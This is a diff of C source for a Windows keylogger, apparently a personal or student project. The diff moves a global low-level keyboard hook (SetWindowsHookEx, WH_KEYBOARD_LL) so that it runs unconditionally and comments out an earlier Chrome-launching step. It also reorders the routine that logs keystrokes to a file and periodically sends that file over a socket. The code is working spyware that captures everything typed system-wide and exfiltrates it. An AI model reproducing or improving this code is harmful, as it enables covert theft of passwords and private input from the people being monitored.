@@ -134,19 +134,22 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 void	setwinhook()
 {
+	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
+		return;
+#if 0
 	STARTUPINFO startup;
 	PROCESS_INFORMATION process;
-	
+
 	SecureZeroMemory(&startup, sizeof(startup));
 	SecureZeroMemory(&process, sizeof(process));
 	startup.cb = sizeof(startup);
 	if (CreateProcess(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &process) == 0)
 		return;
 	//hinst = GetModuleHandle(L"chrome.exe");
-	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)) == NULL)
-		return;
 	CloseHandle(process.hProcess);
 	CloseHandle(process.hThread);
+#endif // 0
+
 }
 
 void	save_data(const char *data)
@@ -173,11 +176,11 @@ void	save_data(const char *data)
 	}
 	if (countTime > 5)
 	{
-		printf("coucou je suis dans le count time\n");
-		send_data(my_sock, file);
 		countTime = 0;
-		if (fclose(file) != 0)
-			_wperror(L" Close file failed ");
+		printf("coucou je suis dans le count time\n");
+		//if (fclose(file) != 0)
+			//_wperror(L" Close file failed ");
+		send_data(my_sock, file);
 		if (_wfopen_s(&file, L"test.txt", L"w+") != 0)
 			_wperror(L" Open file failed ");
 	}
@@ -185,7 +188,6 @@ void	save_data(const char *data)
 		_wperror(L" Close file failed ");
 	timet1 = timet2;
 	nbChar++;
-
 }
 
 int	main(void)
